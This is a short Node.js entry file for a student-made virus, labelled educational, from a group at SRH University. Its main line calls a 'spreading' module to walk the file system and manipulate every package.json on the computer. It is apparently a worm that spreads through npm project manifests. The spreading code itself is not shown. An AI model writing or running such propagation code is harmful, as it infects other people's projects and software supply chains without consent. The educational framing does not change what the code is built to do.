/*
 *                                                              
 *    _/      _/  _/                                    _/_/_/_/   
 *   _/      _/      _/  _/_/  _/    _/    _/_/_/      _/          
 *   _/      _/  _/  _/_/      _/    _/  _/_/          _/_/_/       
 *    _/  _/    _/  _/        _/    _/      _/_/      _/            
 *     _/      _/  _/          _/_/_/  _/_/_/        _/             
 * ===================================================================                                                       
 *
 * ======================================================== *
 * > Description
 * ========================================================
 * This Virus if for educational purposes only!
 * 
 * Made by Group F from the SRH University
 * */



/* ======================================================== *
 * > Imports
 * ======================================================== */
var path = require("path");

/* ======================================================== *
 * > Packages
 * ======================================================== */
var spreading = require('./libs/spreading/package.js');


/* ======================================================== *
 * > Main
 * ======================================================== */

// Manipulate the local package.json (for test purposes)
/*
    var localPackageJson = path.join(__dirname, '.', '/package.json');
    spreading.manipulatePackage(localPackageJson);
*/

// Walk through all package.jsons on the computer
spreading.walkFileSystem();